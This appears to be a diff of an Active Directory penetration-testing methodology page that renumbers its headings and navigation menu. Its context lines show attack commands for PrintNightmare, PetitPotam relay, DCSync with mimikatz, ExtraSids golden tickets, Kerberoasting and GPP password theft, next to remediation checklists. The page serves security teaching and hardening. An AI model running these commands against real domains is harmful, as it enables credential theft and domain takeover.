@@ -1186,7 +1108,7 @@ sudo smbserver.py -smb2support [share-name] /path/to/share
 sudo python3 CVE-2021-1675.py [domain]/[user]:[password]@[dc-ip] '\\[attacker-ip]\[share-name]\backupscript.dll'</code></pre>
 
 
-<h4 id="petitpotam">1.15.3 PetitPotam (CVE-2021-36942)</h4>
+<h4 id="petitpotam">1.13.3 PetitPotam (CVE-2021-36942)</h4>
 
 <p>PetitPotam coerces a Windows host to authenticate to an attacker via MS-EFSRPC. When chained with AD CS, the attacker can relay NTLM to CA web enrollment, obtain a certificate as the DC, and perform DCSync.</p>
 
@@ -1232,19 +1154,19 @@ impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp --adcs --template Domai
   <tr><td>PetitPotam (CVE-2021-36942)</td><td>Apply patches. Disable NTLM on DCs if possible. Enable Extended Protection for Authentication on AD CS. Require SSL for CA web enrollment. Enable SMB signing.</td></tr>
 </tbody>
 </table>
-<h3 id="misc-misconfig">1.16 Miscellaneous Misconfigurations</h3>
+<h3 id="misc-misconfig">1.14 Miscellaneous Misconfigurations</h3>
 
 <p>Common misconfigurations in Exchange, DNS, Group Policy, and service accounts that lead to lateral movement or privilege escalation.</p>
 
-<h4 id="exchange-groups">1.16.1 Exchange-Related Group Membership</h4>
+<h4 id="exchange-groups">1.14.1 Exchange-Related Group Membership</h4>
 
 <p>The <strong>Exchange Windows Permissions</strong> group has WriteDACL on the domain object. The <strong>Organization Management</strong> group can access Exchange mailboxes and potentially modify its own DACL. Compromising these groups can lead to domain-level privilege escalation.</p>
 
-<h4 id="privexchange">1.16.2 PrivExchange</h4>
+<h4 id="privexchange">1.14.2 PrivExchange</h4>
 
 <p>Exploits the Exchange PushSubscription feature to force the Exchange server to authenticate to the attacker via NTLM, which is then relayed to LDAP to grant the attacker WriteDACL on the domain. Requires: Exchange with PushSubscription enabled + NTLM relay to LDAP. Fixed in later Exchange CUs.</p>
 
-<h4 id="printer-bug">1.16.3 Printer Bug (MS-RPRN)</h4>
+<h4 id="printer-bug">1.14.3 Printer Bug (MS-RPRN)</h4>
 
 <p>The Printer Bug forces a host to authenticate back to an attacker via the <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> function. Can be chained with NTLM relay attacks. The spooler service runs as SYSTEM, so the authentication is as the machine account.</p>
 
@@ -1255,11 +1177,11 @@ Get-Service -Name Spooler
 rpcdump.py @[dc-ip] | grep MS-RPRN</code></pre>
 
 
-<h4 id="ms14-068">1.16.4 MS14-068 (Kerberos PAC Forging)</h4>
+<h4 id="ms14-068">1.14.4 MS14-068 (Kerberos PAC Forging)</h4>
 
 <p>Allows forging a PAC (Privilege Attribute Certificate) in a Kerberos TGT to impersonate any user, including Domain Admin. Affects unpatched Windows Server 2003-2012 R2. Exploitable with PyKEK. Patch: KB3011780.</p>
 
-<h4 id="dns-enum">1.16.5 DNS Enumeration</h4>
+<h4 id="dns-enum">1.14.5 DNS Enumeration</h4>
 <p>Dump AD-integrated DNS records. The <code>-r</code> flag resolves entries marked as "unknown."</p>
 
 
@@ -1272,25 +1194,25 @@ adidnsdump -u [domain-short]\\[user] ldap://[dc-ip] -r
 # View results
 cat records.csv</code></pre>
 
-<h4 id="password-description">1.16.6 Password in Description Field</h4>
+<h4 id="password-description">1.14.6 Password in Description Field</h4>
 
 <p>Admins sometimes store passwords in AD user description fields, readable by any authenticated domain user.</p>
 
 
 <pre><code class="language-powershell">Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.description -ne $null}</code></pre>
 
-<h4 id="passwd-notreqd">1.16.7 PASSWD_NOTREQD Flag</h4>
+<h4 id="passwd-notreqd">1.14.7 PASSWD_NOTREQD Flag</h4>
 
 <p>Accounts with this flag can have an empty password, bypassing the domain password policy.</p>
 
 <pre><code class="language-powershell">Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></pre>
 
-<h4 id="sysvol-creds">1.16.8 Credentials in SYSVOL &amp; Scripts</h4>
+<h4 id="sysvol-creds">1.14.8 Credentials in SYSVOL &amp; Scripts</h4>
 
 <p>Administrators sometimes store passwords in scripts on SYSVOL (e.g., <code>reset_local_admin_pass.vbs</code>). SYSVOL is readable by all domain users.</p>
 
 
-<h4 id="gpp-passwords">1.16.9 Group Policy Preferences (GPP) Passwords</h4>
+<h4 id="gpp-passwords">1.14.9 Group Policy Preferences (GPP) Passwords</h4>
 
 <p>GPP allowed storing credentials in XML files (Groups.xml, Services.xml, Scheduledtasks.xml, etc.) in SYSVOL. The AES-256 key used to encrypt the <code>cpassword</code> field was published by Microsoft, making all GPP passwords trivially decryptable.</p>
 
@@ -1302,7 +1224,7 @@ crackmapexec smb [dc-ip] -u [user] -p [password] -M gpp_autologin
 crackmapexec smb [dc-ip] -u [user] -p [password] -M gpp_password</code></pre>
 
 
-<h4 id="asreproasting">1.16.10 ASREPRoasting</h4>
+<h4 id="asreproasting">1.14.10 ASREPRoasting</h4>
 
 <p>Targets accounts with "Do not require Kerberos preauthentication" (DONT_REQ_PREAUTH) enabled. These accounts return an AS-REP with a portion encrypted using the user's password, crackable offline.</p>
 
@@ -1322,7 +1244,7 @@ GetNPUsers.py [domain]/ -dc-ip [dc-ip] -no-pass -usersfile [valid-users]
 kerbrute userenum -d [domain] --dc [dc-ip] /opt/jsmith.txt</code></pre>
 
 
-<h4 id="gpo-abuse">1.16.11 GPO Abuse</h4>
+<h4 id="gpo-abuse">1.14.11 GPO Abuse</h4>
 <p>If a user has WriteProperty or WriteDACL on a GPO linked to an OU, tools like <strong>SharpGPOAbuse</strong> can add the user as a local admin, create scheduled tasks, or add startup scripts on all machines in that OU.</p>
 
 
@@ -1375,13 +1297,13 @@ crackmapexec smb DC_IP -u user -p pass -M gpp_password</code></pre></li>
 <li><label><input type="checkbox"> Audit DONT_REQ_PREAUTH accounts periodically</label>
 <pre><code class="language-powershell">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth</code></pre></li>
 </ul>
-<h3 id="domain-trusts">1.17 Domain Trusts</h3>
+<h3 id="domain-trusts">1.15 Domain Trusts</h3>
 
 <p>Domain and forest trusts define authentication boundaries between AD domains. Trust direction, transitivity, and SID filtering determine cross-domain attack paths.</p>
 
 <figure><img src="./img/cape/sid-history-trust-diagram.png" alt="SID History and Trust Relationship diagram showing domain migration between forests"></figure>
 
-<h4 id="trust-types">1.17.1 Trust Types</h4>
+<h4 id="trust-types">1.15.1 Trust Types</h4>
 
 <table class="custom-table">
 <thead>  <tr><th>Type</th><th>Description</th></tr></thead>
@@ -1397,7 +1319,7 @@ crackmapexec smb DC_IP -u user -p pass -M gpp_password</code></pre></li>
 
 <p>Transitive trusts extend beyond two domains (A trusts B, B trusts C, so A trusts C). Non-transitive trusts exist only between the two specified domains. Direction is either one-way (incoming or outgoing) or bidirectional. In a one-way trust, the trusting domain allows users from the trusted domain to access its resources.</p>
 
-<h4 id="trust-enum">1.17.2 Trust Enumeration</h4>
+<h4 id="trust-enum">1.15.2 Trust Enumeration</h4>
 
 <pre><code class="language-powershell"># PowerShell AD Module
 Get-ADTrust -Filter *
@@ -1432,11 +1354,11 @@ nltest /domain_trusts</code></pre></li>
 <li><label><input type="checkbox"> Identify if SID filtering is enabled or disabled</label></li>
 </ul>
 
-<h3 id="child-parent-trust">1.18 Child-to-Parent Trust Attacks (ExtraSids)</h3>
+<h3 id="child-parent-trust">1.16 Child-to-Parent Trust Attacks (ExtraSids)</h3>
 
 <p>Compromise a child domain, then escalate to the forest root by forging a Golden Ticket with the Enterprise Admins SID injected via the ExtraSids field.</p>
 
-<h4 id="extrasids-overview">1.18.1 Overview</h4>
+<h4 id="extrasids-overview">1.16.1 Overview</h4>
 
 <p>DA in the child domain forges a Golden Ticket with the parent's Enterprise Admins SID (RID 519) in the ExtraSids field, exploiting the SID History mechanism.</p>
 
@@ -1449,7 +1371,7 @@ nltest /domain_trusts</code></pre></li>
 </ul>
 
 
-<h4 id="extrasids-windows">1.18.2 From Windows</h4>
+<h4 id="extrasids-windows">1.16.2 From Windows</h4>
 
 <pre><code class="language-powershell"># Get KRBTGT hash
 mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
@@ -1473,7 +1395,7 @@ ls \\[dc-hostname].[domain]\C$
 # DCSync parent domain
 mimikatz # lsadump::dcsync /user:[DOMAIN]\[user] /domain:[domain]</code></pre>
 
-<h4 id="extrasids-linux">1.18.3 From Linux</h4>
+<h4 id="extrasids-linux">1.16.3 From Linux</h4>
 
 <p>raiseChild.py automates the full chain: finds child/parent DCs, obtains Enterprise Admins SID, gets child KRBTGT, forges the Golden Ticket with ExtraSids, authenticates to the parent, and retrieves parent admin credentials.</p>
 
@@ -1512,7 +1434,7 @@ impacket-psexec -k -no-pass PARENT_DC_HOSTNAME</code></pre></li>
 </ul>
 
 
-<h4 id="extrasids-defense">1.18.4 Remediation</h4>
+<h4 id="extrasids-defense">1.16.4 Remediation</h4>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Enable SID Filtering on all inter-domain trusts to strip foreign SIDs from tokens</label></li>
@@ -1521,11 +1443,11 @@ impacket-psexec -k -no-pass PARENT_DC_HOSTNAME</code></pre></li>
 <li><label><input type="checkbox"> Monitor for TGT requests containing SID History entries (event ID 4769 with extra SIDs)</label></li>
 <li><label><input type="checkbox"> Rotate the KRBTGT password twice to invalidate all existing Golden Tickets</label></li>
 </ul>
-<h3 id="cross-forest">1.19 Cross-Forest Trust Abuse</h3>
+<h3 id="cross-forest">1.17 Cross-Forest Trust Abuse</h3>
 
 <p>Cross-forest trusts are non-transitive by default and enforce SID filtering, but attack paths still exist: Kerberoasting across the trust, shared group memberships, admin credential reuse, and misconfigured SID history.</p>
 
-<h4 id="cross-forest-kerberoast">1.19.1 Cross-Forest Kerberoasting</h4>
+<h4 id="cross-forest-kerberoast">1.17.1 Cross-Forest Kerberoasting</h4>
 
 <p>If a bidirectional or inbound forest trust exists, Kerberoasting can be performed across the trust boundary.</p>
 
@@ -1540,7 +1462,7 @@ GetUserSPNs.py -request -target-domain [foreign-domain] [domain]/[user]
 
 # Crack with Hashcat mode 13100</code></pre>
 
-<h4 id="cross-forest-membership">1.19.2 Foreign Group Membership &amp; Admin Password Reuse</h4>
+<h4 id="cross-forest-membership">1.17.2 Foreign Group Membership &amp; Admin Password Reuse</h4>
 
 <p>Only <strong>Domain Local Groups</strong> allow members from outside the forest. Check if built-in Administrators in Forest B contains Domain Admins or Enterprise Admins from Forest A. Also check for password reuse between similarly-named admin accounts across forests (e.g., <code>adm_bob.smith</code> in Domain A and <code>bsmith_admin</code> in Domain B).</p>
 
@@ -1552,7 +1474,7 @@ Convert-SidToName [administrator-sid]
 Enter-PSSession -ComputerName [foreign-dc-hostname].[foreign-domain] -Credential [DOMAIN]\administrator</code></pre>
 
 
-<h4 id="cross-forest-bloodhound">1.19.3 Hunting Foreign Membership with BloodHound (Linux)</h4>
+<h4 id="cross-forest-bloodhound">1.17.3 Hunting Foreign Membership with BloodHound (Linux)</h4>
 
 <p>Collect BloodHound data from both domains and upload to the same database to map cross-forest attack paths.</p>
 
@@ -1574,7 +1496,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 # Upload both datasets to BloodHound GUI
 # Use: Analysis &gt; "Users with Foreign Domain Group Membership"</code></pre>
 
-<h4 id="sid-history-cross-forest">1.19.4 SID History Abuse Across Forests</h4>
+<h4 id="sid-history-cross-forest">1.17.4 SID History Abuse Across Forests</h4>
 
 <p>If SID Filtering is disabled on a forest trust, migrated users retain SID History from the source forest, including any administrative rights.</p>
 
@@ -1604,11 +1526,11 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Monitor for cross-forest TGS requests (event ID 4769 with target domain != source domain)</label></li>
 </ul>
 
-<h3 id="hardening-ad">1.20 Hardening Active Directory</h3>
+<h3 id="hardening-ad">1.18 Hardening Active Directory</h3>
 
 <p>Hardening controls mapped to the attack techniques in this section.</p>
 
-<h4 id="hardening-audit">1.20.1 Document and Audit</h4>
+<h4 id="hardening-audit">1.18.1 Document and Audit</h4>
 
 <p>Perform annual (or quarterly) audits of:</p>
 <ul class="methodology-checklist">
@@ -1622,7 +1544,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Compare users with elevated permissions against approved access lists</label></li>
 </ul>
 
-<h4 id="hardening-people">1.20.2 People</h4>
+<h4 id="hardening-people">1.18.2 People</h4>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Enforce password policy with a custom password filter that blocks company names, seasons, months, and common patterns (Password1, Welcome1, Season+Year)</label></li>
@@ -1634,7 +1556,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Disable Kerberos delegation for all admin accounts and add them to Protected Users group</label></li>
 </ul>
 
-<h4 id="protected-users">1.20.3 Protected Users Group</h4>
+<h4 id="protected-users">1.18.3 Protected Users Group</h4>
 
 <p>Members receive these protections:</p>
 <ul class="methodology-checklist">
@@ -1647,7 +1569,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <pre><code class="language-powershell">Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members</code></pre></li>
 </ul>
 
-<h4 id="hardening-process">1.20.4 Processes</h4>
+<h4 id="hardening-process">1.18.4 Processes</h4>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Maintain AD asset management policies that track all domain-joined devices and their owners</label></li>
@@ -1658,7 +1580,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Schedule quarterly user, group, and host audits with automated reporting</label></li>
 </ul>
 
-<h4 id="hardening-technology">1.20.5 Technology</h4>
+<h4 id="hardening-technology">1.18.5 Technology</h4>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Run BloodHound, PingCastle, and Group3r periodically, quarterly at minimum</label></li>
@@ -1678,7 +1600,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Test and validate backups regularly, including domain recovery from backup</label></li>
 </ul>
 
-<h4 id="protections-by-ttp">1.20.6 Protections by TTP (MITRE ATT&amp;CK Mapping)</h4>
+<h4 id="protections-by-ttp">1.18.6 Protections by TTP (MITRE ATT&amp;CK Mapping)</h4>
 
 <table class="custom-table">
 <thead>  <tr><th>TTP</th><th>MITRE Tag</th><th>Key Defenses</th></tr></thead>
@@ -1707,11 +1629,11 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> Verify remediation recommendations in report</label></li>
 </ul>
 
-<h3 id="ad-auditing">1.21 Additional AD Auditing Techniques</h3>
+<h3 id="ad-auditing">1.19 Additional AD Auditing Techniques</h3>
 
 <p>AD auditing tools for generating risk assessments and remediation evidence.</p>
 
-<h4 id="ad-explorer">1.21.1 Active Directory Explorer (Sysinternals)</h4>
+<h4 id="ad-explorer">1.19.1 Active Directory Explorer (Sysinternals)</h4>
 
 <p>AD Explorer is a Sysinternals GUI for browsing and editing AD objects, attributes, and permissions. Connect with any valid domain user credentials. Take snapshots for offline analysis during the reporting phase, and diff two snapshots to detect changes made between assessment phases.</p>
 
@@ -1723,7 +1645,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <li><label><input type="checkbox"> File &rarr; Compare to diff two snapshots and identify modified objects, attributes, and permissions</label></li>
 </ul>
 
-<h4 id="pingcastle">1.21.2 PingCastle</h4>
+<h4 id="pingcastle">1.19.2 PingCastle</h4>
 
 <p>PingCastle evaluates AD security posture using a CMMI-based risk assessment framework. The default <code>healthcheck</code> mode produces an HTML report covering misconfigurations, vulnerabilities, shares, trusts, delegation, and user/computer state. Scores are broken into four categories: Stale Objects, Privileged Accounts, Trusts, and Anomalies, each scored 0-100.</p>
 
@@ -1745,7 +1667,7 @@ PingCastle.exe --interactive</code></pre>
 </ul>
 
 
-<h4 id="group3r">1.21.3 Group3r</h4>
+<h4 id="group3r">1.19.3 Group3r</h4>
 
 <p>Group3r finds vulnerabilities in AD Group Policy Objects. It must run from a domain-joined host as a domain user (not necessarily an administrator), or in the context of a domain user via <code>runas /netonly</code>.</p>
 
@@ -1765,7 +1687,7 @@ group3r.exe -s</code></pre>
 <li><label><input type="checkbox"> Cross-reference findings with BloodHound and PingCastle results</label></li>
 </ul>
 
-<h4 id="adrecon">1.21.4 ADRecon</h4>
+<h4 id="adrecon">1.19.4 ADRecon</h4>
 
 <p>ADRecon extracts comprehensive AD data to CSV and optional Excel reports. It covers users, SPNs, groups, membership changes, OUs, GPOs, DNS zones, printers, computers, LAPS, and BitLocker recovery keys (privileged account required for LAPS and BitLocker). For GPO reporting, the host must have the <code>GroupPolicy</code> PowerShell module installed.</p>
 
@@ -18601,178 +18523,170 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 <div id="index" class="index">
 <button class="dropdown-btn section-flow-1">1. Active Directory Enumeration and Exploitation<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-1">
-<a class="dropdown-link" href="#ad-overview">1.1 Active Directory Overview &amp; Engagement Setup</a>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.2 External Reconnaissance<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.1 Initial Enumeration of the Domain<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#external-recon-targets">1.2.1 Target Data</a>
-<a href="#external-recon-tools">1.2.2 Google Dorks</a>
-</div>
-</div>
-<div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.3 Initial Enumeration of the Domain<i class="bi bi-caret-down-fill"></i></button>
-<div class="nested-dropdown-container">
-<a href="#passive-host-id">1.3.1 Passive Host Identification</a>
-<a href="#active-host-id">1.3.2 Active Host Identification</a>
-<a href="#user-enum-kerbrute">1.3.3 User Enumeration with Kerbrute</a>
-<a href="#system-access">1.3.4 Gaining a Foothold via SYSTEM Access</a>
+<a href="#passive-host-id">1.1.1 Passive Host Identification</a>
+<a href="#active-host-id">1.1.2 Active Host Identification</a>
+<a href="#user-enum-kerbrute">1.1.3 User Enumeration with Kerbrute</a>
+<a href="#system-access">1.1.4 Gaining a Foothold via SYSTEM Access</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.4 LLMNR/NBT-NS Poisoning<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.2 LLMNR/NBT-NS Poisoning<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#llmnr-overview">1.4.1 Capture Workflow</a>
-<a href="#responder-linux">1.4.2 Responder (Linux)</a>
-<a href="#inveigh-windows">1.4.3 Inveigh (Windows)</a>
-<a href="#llmnr-remediation">1.4.4 Remediation</a>
+<a href="#llmnr-overview">1.2.1 Capture Workflow</a>
+<a href="#responder-linux">1.2.2 Responder (Linux)</a>
+<a href="#inveigh-windows">1.2.3 Inveigh (Windows)</a>
+<a href="#llmnr-remediation">1.2.4 Remediation</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.5 Password Spraying<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.3 Password Spraying<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#password-policy">1.5.1 Enumerating the Password Policy</a>
-<a href="#building-user-lists">1.5.2 Building Target User Lists</a>
-<a href="#spraying-linux">1.5.3 Password Spraying from Linux</a>
-<a href="#spraying-windows">1.5.4 Password Spraying from Windows</a>
-<a href="#spraying-mitigation">1.5.5 Mitigation &amp; Detection</a>
+<a href="#password-policy">1.3.1 Enumerating the Password Policy</a>
+<a href="#building-user-lists">1.3.2 Building Target User Lists</a>
+<a href="#spraying-linux">1.3.3 Password Spraying from Linux</a>
+<a href="#spraying-windows">1.3.4 Password Spraying from Windows</a>
+<a href="#spraying-mitigation">1.3.5 Mitigation &amp; Detection</a>
 </div>
 </div>
-<a class="dropdown-link" href="#security-controls">1.6 Enumerating Security Controls</a>
+<a class="dropdown-link" href="#security-controls">1.4 Enumerating Security Controls</a>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.7 Credentialed Enumeration from Linux<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.5 Credentialed Enumeration from Linux<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#cme-enum">1.7.1 CrackMapExec</a>
-<a href="#smbmap-enum">1.7.2 SMBMap</a>
-<a href="#rpcclient-enum">1.7.3 rpcclient</a>
-<a href="#impacket-enum">1.7.4 Impacket Toolkit</a>
-<a href="#windapsearch-enum">1.7.5 Windapsearch</a>
-<a href="#bloodhound-py">1.7.6 BloodHound.py</a>
-</div>
-</div>
-<div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.8 Credentialed Enumeration from Windows<i class="bi bi-caret-down-fill"></i></button>
-<div class="nested-dropdown-container">
-<a href="#ad-powershell">1.8.1 ActiveDirectory PowerShell Module</a>
-<a href="#powerview">1.8.2 PowerView</a>
-<a href="#snaffler">1.8.3 Snaffler (Credential Hunting in Shares)</a>
-<a href="#sharphound">1.8.4 SharpHound / BloodHound</a>
+<a href="#cme-enum">1.5.1 CrackMapExec</a>
+<a href="#smbmap-enum">1.5.2 SMBMap</a>
+<a href="#rpcclient-enum">1.5.3 rpcclient</a>
+<a href="#impacket-enum">1.5.4 Impacket Toolkit</a>
+<a href="#windapsearch-enum">1.5.5 Windapsearch</a>
+<a href="#bloodhound-py">1.5.6 BloodHound.py</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.9 Living Off the Land<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.6 Credentialed Enumeration from Windows<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#lotl-basics">1.9.1 Basic Host &amp; Network Recon</a>
-<a href="#lotl-powershell">1.9.2 PowerShell</a>
-<a href="#lotl-wmi">1.9.3 WMI</a>
-<a href="#lotl-net">1.9.4 Net Commands</a>
-<a href="#lotl-dsquery">1.9.5 Dsquery</a>
+<a href="#ad-powershell">1.6.1 ActiveDirectory PowerShell Module</a>
+<a href="#powerview">1.6.2 PowerView</a>
+<a href="#snaffler">1.6.3 Snaffler (Credential Hunting in Shares)</a>
+<a href="#sharphound">1.6.4 SharpHound / BloodHound</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.10 Kerberoasting<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.7 Living Off the Land<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#kerberoast-overview">1.10.1 Overview</a>
-<a href="#kerberoast-linux">1.10.2 Kerberoasting from Linux</a>
-<a href="#kerberoast-windows">1.10.3 Kerberoasting from Windows</a>
-<a href="#kerberoast-encryption">1.10.4 Encryption Type Considerations</a>
-<a href="#kerberoast-defense">1.10.5 Mitigation &amp; Detection</a>
+<a href="#lotl-basics">1.7.1 Basic Host &amp; Network Recon</a>
+<a href="#lotl-powershell">1.7.2 PowerShell</a>
+<a href="#lotl-wmi">1.7.3 WMI</a>
+<a href="#lotl-net">1.7.4 Net Commands</a>
+<a href="#lotl-dsquery">1.7.5 Dsquery</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.11 ACL/ACE Abuse<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.8 Kerberoasting<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#acl-overview">1.11.1 ACL Concepts</a>
-<a href="#acl-enumeration">1.11.2 ACL Enumeration</a>
-<a href="#acl-attack-chain">1.11.3 ACL Abuse Attack Chain Example</a>
-<a href="#acl-cleanup">1.11.4 Cleanup</a>
-<a href="#acl-defense">1.11.5 Remediation &amp; Detection</a>
+<a href="#kerberoast-overview">1.8.1 Overview</a>
+<a href="#kerberoast-linux">1.8.2 Kerberoasting from Linux</a>
+<a href="#kerberoast-windows">1.8.3 Kerberoasting from Windows</a>
+<a href="#kerberoast-encryption">1.8.4 Encryption Type Considerations</a>
+<a href="#kerberoast-defense">1.8.5 Mitigation &amp; Detection</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.12 DCSync Attack<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.9 ACL/ACE Abuse<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#dcsync-overview">1.12.1 Replication Privileges</a>
-<a href="#dcsync-linux">1.12.2 DCSync from Linux (secretsdump.py)</a>
-<a href="#dcsync-windows">1.12.3 DCSync from Windows (Mimikatz)</a>
-<a href="#dcsync-defense">1.12.4 Remediation</a>
+<a href="#acl-overview">1.9.1 ACL Concepts</a>
+<a href="#acl-enumeration">1.9.2 ACL Enumeration</a>
+<a href="#acl-attack-chain">1.9.3 ACL Abuse Attack Chain Example</a>
+<a href="#acl-cleanup">1.9.4 Cleanup</a>
+<a href="#acl-defense">1.9.5 Remediation &amp; Detection</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.13 Privileged Access<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.10 DCSync Attack<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#rdp-access">1.13.1 Remote Desktop (RDP)</a>
-<a href="#winrm-access">1.13.2 WinRM</a>
-<a href="#sql-admin">1.13.3 SQL Server Admin</a>
-</div>
-</div>
-<a class="dropdown-link" href="#double-hop">1.14 Kerberos Double Hop Problem</a>
-<div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.15 Bleeding Edge Vulnerabilities<i class="bi bi-caret-down-fill"></i></button>
-<div class="nested-dropdown-container">
-<a href="#nopac">1.15.1 NoPac / SamAccountName Spoofing</a>
-<a href="#printnightmare">1.15.2 PrintNightmare (CVE-2021-34527 / CVE-2021-1675)</a>
-<a href="#petitpotam">1.15.3 PetitPotam (CVE-2021-36942)</a>
+<a href="#dcsync-overview">1.10.1 Replication Privileges</a>
+<a href="#dcsync-linux">1.10.2 DCSync from Linux (secretsdump.py)</a>
+<a href="#dcsync-windows">1.10.3 DCSync from Windows (Mimikatz)</a>
+<a href="#dcsync-defense">1.10.4 Remediation</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.16 Miscellaneous Misconfigurations<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.11 Privileged Access<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#exchange-groups">1.16.1 Exchange-Related Group Membership</a>
-<a href="#privexchange">1.16.2 PrivExchange</a>
-<a href="#printer-bug">1.16.3 Printer Bug (MS-RPRN)</a>
-<a href="#ms14-068">1.16.4 MS14-068 (Kerberos PAC Forging)</a>
-<a href="#dns-enum">1.16.5 DNS Enumeration</a>
-<a href="#password-description">1.16.6 Password in Description Field</a>
-<a href="#passwd-notreqd">1.16.7 PASSWD_NOTREQD Flag</a>
-<a href="#sysvol-creds">1.16.8 Credentials in SYSVOL &amp; Scripts</a>
-<a href="#gpp-passwords">1.16.9 Group Policy Preferences (GPP) Passwords</a>
-<a href="#asreproasting">1.16.10 ASREPRoasting</a>
-<a href="#gpo-abuse">1.16.11 GPO Abuse</a>
+<a href="#rdp-access">1.11.1 Remote Desktop (RDP)</a>
+<a href="#winrm-access">1.11.2 WinRM</a>
+<a href="#sql-admin">1.11.3 SQL Server Admin</a>
+</div>
+</div>
+<a class="dropdown-link" href="#double-hop">1.12 Kerberos Double Hop Problem</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">1.13 Bleeding Edge Vulnerabilities<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#nopac">1.13.1 NoPac / SamAccountName Spoofing</a>
+<a href="#printnightmare">1.13.2 PrintNightmare (CVE-2021-34527 / CVE-2021-1675)</a>
+<a href="#petitpotam">1.13.3 PetitPotam (CVE-2021-36942)</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.17 Domain Trusts<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.14 Miscellaneous Misconfigurations<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#trust-types">1.17.1 Trust Types</a>
-<a href="#trust-enum">1.17.2 Trust Enumeration</a>
+<a href="#exchange-groups">1.14.1 Exchange-Related Group Membership</a>
+<a href="#privexchange">1.14.2 PrivExchange</a>
+<a href="#printer-bug">1.14.3 Printer Bug (MS-RPRN)</a>
+<a href="#ms14-068">1.14.4 MS14-068 (Kerberos PAC Forging)</a>
+<a href="#dns-enum">1.14.5 DNS Enumeration</a>
+<a href="#password-description">1.14.6 Password in Description Field</a>
+<a href="#passwd-notreqd">1.14.7 PASSWD_NOTREQD Flag</a>
+<a href="#sysvol-creds">1.14.8 Credentials in SYSVOL &amp; Scripts</a>
+<a href="#gpp-passwords">1.14.9 Group Policy Preferences (GPP) Passwords</a>
+<a href="#asreproasting">1.14.10 ASREPRoasting</a>
+<a href="#gpo-abuse">1.14.11 GPO Abuse</a>
 </div>
 </div>
